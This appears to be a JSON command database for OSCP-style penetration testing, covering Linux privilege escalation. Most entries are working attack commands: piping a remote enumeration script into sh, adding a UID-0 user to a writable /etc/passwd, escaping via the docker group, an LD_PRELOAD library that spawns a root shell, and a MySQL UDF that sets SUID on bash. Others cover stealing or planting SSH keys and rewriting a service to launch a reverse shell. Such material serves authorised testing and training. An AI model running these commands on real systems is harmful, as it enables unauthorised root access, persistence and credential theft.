{
  "category": "post-exploit",
  "subcategory": "linux",
  "description": "Linux privilege escalation commands and techniques",
  "commands": [
    {
      "id": "linux-privesc-linpeas",
      "name": "LinPEAS - Automated Enumeration",
      "category": "post-exploit",
      "subcategory": "linux",
      "command": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
      "description": "Comprehensive automated privilege escalation enumeration for Linux",
      "variables": [],
      "flag_explanations": {
        "-L": "Follow redirects when downloading",
        "| sh": "Pipe directly to shell for execution"
      },
      "tags": ["AUTOMATED", "QUICK_WIN", "OSCP:HIGH"],
      "oscp_relevance": "high",
      "success_indicators": [
        "95% PE vectors highlighted in red/yellow",
        "SUID binaries listed",
        "Writable files shown",
        "Cronjobs enumerated"
      ],
      "failure_indicators": [
        "Cannot connect to github.com",
        "Permission denied on /tmp"
      ],
      "next_steps": [
        "Focus on RED/YELLOW findings first",
        "Check SUID binaries manually",
        "Examine cronjobs for writable scripts"
      ],
      "alternatives": [
        "Transfer linpeas.sh via file transfer methods",
        "Use LinEnum if LinPEAS fails",
        "Manual enumeration with individual commands"
      ],
      "notes": "Save output to file for later analysis: linpeas.sh | tee linpeas.out"
    },
    {
      "id": "linux-privesc-linenum",
      "name": "LinEnum - Basic Enumeration",
      "category": "post-exploit",
      "subcategory": "linux",
      "command": "wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh && chmod +x LinEnum.sh && ./LinEnum.sh",
      "description": "Basic Linux enumeration script for privilege escalation",
      "variables": [],
      "flag_explanations": {
        "chmod +x": "Make script executable",
        "./": "Execute in current directory"
      },
      "tags": ["AUTOMATED", "OSCP:HIGH"],
      "oscp_relevance": "high",
      "success_indicators": [
        "User information displayed",
        "SUID files found",
        "Network connections listed"
      ],
      "failure_indicators": [
        "wget: command not found",
        "Cannot write to current directory"
      ],
      "alternatives": [
        "Use curl instead of wget",
        "Upload via Python HTTP server",
        "Use LinPEAS for more comprehensive scan"
      ],
      "notes": "Lighter weight than LinPEAS, good for restricted environments"
    },
    {
      "id": "linux-suid-find",
      "name": "Find SUID Binaries",
      "category": "post-exploit",
      "subcategory": "linux",
      "command": "find / -perm -u=s -type f 2>/dev/null",
      "description": "Manually find all SUID binaries (may lead to privilege escalation)",
      "variables": [],
      "flag_explanations": {
        "-perm -u=s": "Find files with SUID bit set",
        "-type f": "Only search for files (not directories)",
        "2>/dev/null": "Suppress permission denied errors"
      },
      "tags": ["MANUAL", "OSCP:HIGH", "QUICK_WIN"],
      "oscp_relevance": "high",
      "success_indicators": [
        "List of SUID binaries returned",
        "Unusual binaries found (not system defaults)"
      ],
      "failure_indicators": [
        "Empty output",
        "Permission denied on all paths"
      ],
      "next_steps": [
        "Check each binary against GTFOBins",
        "Test unusual SUID binaries for exploits",
        "Run 'strings' on custom binaries"
      ],
      "alternatives": [
        "find / -perm -4000 2>/dev/null",
        "find / -user root -perm -4000 -exec ls -ldb {} \\;"
      ],
      "notes": "Cross-reference findings with https://gtfobins.github.io/"
    },
    {
      "id": "linux-sudo-list",
      "name": "Check Sudo Permissions",
      "category": "post-exploit",
      "subcategory": "linux",
      "command": "sudo -l",
      "description": "List commands current user can run with sudo",
      "variables": [],
      "flag_explanations": {
        "-l": "List allowed (and forbidden) commands for user"
      },
      "tags": ["MANUAL", "OSCP:HIGH", "QUICK_WIN"],
      "oscp_relevance": "high",
      "success_indicators": [
        "Commands listed that can run as root",
        "NOPASSWD entries found",
        "Wildcard permissions discovered"
      ],
      "failure_indicators": [
        "Sorry, user may not run sudo",
        "sudo: no tty present"
      ],
      "next_steps": [
        "Check GTFOBins for allowed commands",
        "Test for path injection if wildcards present",
        "Examine scripts for writable paths"
      ],
      "alternatives": [
        "Check /etc/sudoers if readable",
        "sudo -ll for detailed output"
      ],
      "notes": "NOPASSWD is a major win - can escalate without password"
    },
    {
      "id": "linux-cron-enum",
      "name": "Enumerate Cron Jobs",
      "category": "post-exploit",
      "subcategory": "linux",
      "command": "cat /etc/crontab && ls -la /etc/cron.* && crontab -l",
      "description": "Check for scheduled tasks that may be exploitable",
      "variables": [],
      "flag_explanations": {
        "cat /etc/crontab": "View system-wide crontab",
        "ls -la /etc/cron.*": "List cron directories",
        "crontab -l": "List user's cron jobs"
      },
      "tags": ["MANUAL", "OSCP:HIGH"],
      "oscp_relevance": "high",
      "success_indicators": [
        "Cron jobs running as root found",
        "Writable scripts in cron jobs",
        "Wildcard usage in cron commands"
      ],
      "failure_indicators": [
        "no crontab for user",
        "Permission denied on /etc/crontab"
      ],
      "next_steps": [
        "Check if cron scripts are writable",
        "Test for PATH hijacking in cron",
        "Monitor with pspy if jobs run frequently"
      ],
      "alternatives": [
        "Use pspy to monitor processes",
        "grep -r '/etc/cron' /etc/",
        "systemctl list-timers"
      ],
      "notes": "Pay attention to scripts run by root with writable paths"
    },
    {
      "id": "linux-writable-etc-passwd",
      "name": "Check Writable /etc/passwd",
      "category": "post-exploit",
      "subcategory": "linux",
      "command": "ls -l /etc/passwd && echo 'test' >> /etc/passwd 2>/dev/null && echo 'Writable!' || echo 'Not writable'",
      "description": "Test if /etc/passwd is writable (instant root if true)",
      "variables": [],
      "flag_explanations": {
        "ls -l": "Show file permissions",
        ">>": "Append to file",
        "2>/dev/null": "Hide error messages",
        "||": "OR operator - run second command if first fails"
      },
      "tags": ["MANUAL", "OSCP:HIGH", "QUICK_WIN"],
      "oscp_relevance": "high",
      "success_indicators": [
        "Writable! message displayed",
        "Write permissions shown in ls output"
      ],
      "failure_indicators": [
        "Not writable message",
        "Permission denied"
      ],
      "next_steps": [
        "Generate password hash with openssl",
        "Add new root user to /etc/passwd",
        "su to new user for root shell"
      ],
      "alternatives": [
        "openssl passwd -1 -salt salt password",
        "echo 'newroot:$1$salt$hash:0:0:root:/root:/bin/bash' >> /etc/passwd"
      ],
      "notes": "If writable: openssl passwd -1 password123, then add user with UID 0"
    },
    {
      "id": "linux-capabilities",
      "name": "Enumerate File Capabilities",
      "category": "post-exploit",
      "subcategory": "linux",
      "command": "getcap -r / 2>/dev/null",
      "description": "Find files with special capabilities that may allow privilege escalation",
      "variables": [],
      "flag_explanations": {
        "-r": "Recursive search",
        "/": "Search from root",
        "2>/dev/null": "Hide permission errors"
      },
      "tags": ["MANUAL", "OSCP:MEDIUM"],
      "oscp_relevance": "medium",
      "success_indicators": [
        "cap_setuid+ep found on binary",
        "cap_dac_read_search capabilities found"
      ],
      "failure_indicators": [
        "getcap: command not found",
        "Empty output"
      ],
      "next_steps": [
        "Check GTFOBins for capability exploits",
        "Test cap_setuid binaries for root shell",
        "Examine cap_dac_read_search for file reading"
      ],
      "alternatives": [
        "Manual search in /usr/bin and /usr/sbin",
        "Use LinPEAS which includes capability check"
      ],
      "notes": "cap_setuid+ep on python/perl/ruby = easy root shell"
    },
    {
      "id": "linux-kernel-exploit",
      "name": "Check Kernel Version for Exploits",
      "category": "post-exploit",
      "subcategory": "linux",
      "command": "uname -a && cat /etc/issue",
      "description": "Identify kernel version to search for known exploits",
      "variables": [],
      "flag_explanations": {
        "uname -a": "Print all system information",
        "cat /etc/issue": "Show distribution version"
      },
      "tags": ["MANUAL", "OSCP:MEDIUM"],
      "oscp_relevance": "medium",
      "success_indicators": [
        "Kernel version displayed",
        "Distribution info shown"
      ],
      "failure_indicators": [
        "Command not found"
      ],
      "next_steps": [
        "Search kernel version on searchsploit",
        "Check exploit-db for distro-specific exploits",
        "Compile and test kernel exploits"
      ],
      "alternatives": [
        "cat /proc/version",
        "lsb_release -a",
        "hostnamectl"
      ],
      "notes": "Kernel exploits are risky - test in safe environment first"
    },
    {
      "id": "linux-writable-services",
      "name": "Find Writable Service Files",
      "category": "post-exploit",
      "subcategory": "linux",
      "command": "find /etc/systemd/system -writable -type f 2>/dev/null",
      "description": "Locate systemd service files that are writable (can modify to escalate)",
      "variables": [],
      "flag_explanations": {
        "-writable": "Find files writable by current user",
        "-type f": "Only files, not directories"
      },
      "tags": ["MANUAL", "OSCP:MEDIUM"],
      "oscp_relevance": "medium",
      "success_indicators": [
        "Writable .service files found",
        "Files owned by current user"
      ],
      "failure_indicators": [
        "Empty output",
        "Permission denied on all files"
      ],
      "next_steps": [
        "Modify service to run payload",
        "Restart service with systemctl",
        "Check service runs as root"
      ],
      "alternatives": [
        "ls -la /etc/systemd/system/*.service",
        "systemctl list-unit-files"
      ],
      "notes": "Modify ExecStart to run reverse shell as root"
    },
    {
      "id": "linux-nfs-no-root-squash",
      "name": "Check NFS for no_root_squash",
      "category": "post-exploit",
      "subcategory": "linux",
      "command": "cat /etc/exports && showmount -e <TARGET>",
      "description": "Find NFS shares with no_root_squash (allows mounting as root)",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target IP with NFS share",
          "example": "192.168.45.100",
          "required": true
        }
      ],
      "flag_explanations": {
        "cat /etc/exports": "View NFS export configuration",
        "showmount -e": "Show exported directories",
        "no_root_squash": "Root on client = root on server"
      },
      "tags": ["MANUAL", "OSCP:MEDIUM"],
      "oscp_relevance": "medium",
      "success_indicators": [
        "no_root_squash in /etc/exports",
        "Writable NFS shares listed"
      ],
      "failure_indicators": [
        "File not found",
        "No exports available"
      ],
      "next_steps": [
        "Mount NFS share on attacking machine",
        "Create SUID binary on share as root",
        "Execute SUID binary from target"
      ],
      "alternatives": [
        "Use metasploit NFS scanner",
        "nmap --script nfs-showmount"
      ],
      "notes": "Mount with: mount -o rw <TARGET>:/share /mnt/nfs"
    },
    {
      "id": "linux-docker-escape",
      "name": "Check Docker Group Membership",
      "category": "post-exploit",
      "subcategory": "linux",
      "command": "id && groups && docker ps 2>/dev/null",
      "description": "Check if user is in docker group (allows easy root escalation)",
      "variables": [],
      "flag_explanations": {
        "id": "Show user ID and groups",
        "groups": "List groups user belongs to",
        "docker ps": "Test docker access"
      },
      "tags": ["MANUAL", "OSCP:HIGH", "QUICK_WIN"],
      "oscp_relevance": "high",
      "success_indicators": [
        "docker group in output",
        "Docker commands execute successfully"
      ],
      "failure_indicators": [
        "Permission denied",
        "docker: command not found"
      ],
      "next_steps": [
        "Run: docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
        "Mount host filesystem in container",
        "Access as root via container"
      ],
      "alternatives": [
        "docker run -v /:/hostfs -it ubuntu bash",
        "LXC/LXD container escape if available"
      ],
      "notes": "Docker group = root equivalent - instant privilege escalation"
    },
    {
      "id": "linux-ld-preload",
      "name": "LD_PRELOAD Privilege Escalation",
      "category": "post-exploit",
      "subcategory": "linux",
      "command": "sudo -l | grep LD_PRELOAD",
      "description": "Check if LD_PRELOAD is allowed in sudo environment",
      "variables": [],
      "flag_explanations": {
        "sudo -l": "List sudo permissions",
        "grep LD_PRELOAD": "Search for LD_PRELOAD in env_keep",
        "env_keep": "Environment variables preserved with sudo"
      },
      "tags": ["MANUAL", "OSCP:MEDIUM"],
      "oscp_relevance": "medium",
      "success_indicators": [
        "env_keep+=LD_PRELOAD found",
        "Can set LD_PRELOAD in sudo"
      ],
      "failure_indicators": [
        "LD_PRELOAD not in env_keep",
        "env_reset prevents LD_PRELOAD"
      ],
      "next_steps": [
        "Create shared library with setuid(0)",
        "Compile with: gcc -fPIC -shared -o shell.so shell.c -nostartfiles",
        "Run: sudo LD_PRELOAD=/tmp/shell.so program"
      ],
      "alternatives": [
        "LD_LIBRARY_PATH if LD_PRELOAD blocked",
        "Create hijacking library for loaded .so"
      ],
      "notes": "Requires C code: void _init() { setuid(0); system('/bin/bash'); }"
    },
    {
      "id": "linux-path-hijack",
      "name": "PATH Hijacking",
      "category": "post-exploit",
      "subcategory": "linux",
      "command": "echo $PATH && find / -perm -u=s -type f 2>/dev/null | xargs strings | grep -i 'path'",
      "description": "Find SUID binaries vulnerable to PATH hijacking",
      "variables": [],
      "flag_explanations": {
        "echo $PATH": "Show current PATH variable",
        "xargs strings": "Extract readable strings from binaries",
        "grep -i path": "Search for PATH references"
      },
      "tags": ["MANUAL", "OSCP:HIGH"],
      "oscp_relevance": "high",
      "success_indicators": [
        "SUID binary calls command without full path",
        "Writable directory in PATH"
      ],
      "failure_indicators": [
        "All commands use absolute paths",
        "No writable PATH directories"
      ],
      "next_steps": [
        "Create malicious binary with same name",
        "Add writable directory to PATH",
        "Execute vulnerable SUID binary"
      ],
      "alternatives": [
        "Library hijacking if PATH is protected",
        "Symlink attacks for relative paths"
      ],
      "notes": "Example: if SUID calls 'ls', create /tmp/ls with shell, add /tmp to PATH"
    },
    {
      "id": "linux-ssh-keys",
      "name": "Search for SSH Private Keys",
      "category": "post-exploit",
      "subcategory": "linux",
      "command": "find / -name id_rsa 2>/dev/null && find / -name id_dsa 2>/dev/null",
      "description": "Find SSH private keys that may allow lateral movement or escalation",
      "variables": [],
      "flag_explanations": {
        "-name id_rsa": "Search for RSA private keys",
        "-name id_dsa": "Search for DSA private keys"
      },
      "tags": ["MANUAL", "OSCP:MEDIUM"],
      "oscp_relevance": "medium",
      "success_indicators": [
        "Private keys found",
        "Keys readable by current user"
      ],
      "failure_indicators": [
        "No keys found",
        "All keys encrypted with passphrase"
      ],
      "next_steps": [
        "Copy key to attacking machine",
        "chmod 600 id_rsa",
        "ssh -i id_rsa user@target"
      ],
      "alternatives": [
        "find / -name authorized_keys",
        "grep -r 'PRIVATE KEY' /home 2>/dev/null"
      ],
      "notes": "Also check .ssh/authorized_keys for adding your own key"
    },
    {
      "id": "linux-mysql-udf",
      "name": "MySQL User Defined Function Exploit",
      "category": "post-exploit",
      "subcategory": "linux",
      "command": "mysql -u root -p<PASSWORD> -e 'SELECT * FROM mysql.func;'",
      "description": "Check MySQL for UDF privilege escalation opportunity",
      "variables": [
        {
          "name": "<PASSWORD>",
          "description": "MySQL root password if known",
          "example": "password123",
          "required": false
        }
      ],
      "flag_explanations": {
        "-u root": "Connect as root user",
        "-p": "Prompt for password (or use -p<PASSWORD>)",
        "-e": "Execute SQL command"
      },
      "tags": ["MANUAL", "OSCP:LOW"],
      "oscp_relevance": "low",
      "success_indicators": [
        "MySQL accessible as root",
        "UDF functions present or can be created"
      ],
      "failure_indicators": [
        "Access denied",
        "MySQL not installed"
      ],
      "next_steps": [
        "Upload lib_mysqludf_sys.so",
        "CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so'",
        "SELECT sys_exec('chmod +s /bin/bash')"
      ],
      "alternatives": [
        "Raptor UDF exploit",
        "Write webshell via MySQL INTO OUTFILE"
      ],
      "notes": "Requires MySQL running as root or with file write permissions"
    }
  ]
}
